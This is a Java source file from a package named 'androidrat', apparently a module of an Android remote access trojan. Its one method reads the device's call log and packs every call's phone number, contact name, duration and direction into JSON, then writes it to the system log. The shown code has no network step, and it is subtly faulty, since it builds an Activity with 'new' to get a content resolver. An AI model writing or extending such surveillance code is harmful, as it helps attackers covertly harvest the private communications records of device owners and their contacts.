package com.ot.androidrat;

import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallLog {

    public void viewCallLog(){
        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = new MainActivity().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));// for  number
                String name = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));// for name
                String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));// for duration
                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE)));// for call type, Incoming or out going.


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            Log.i("Result", Calls.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

}
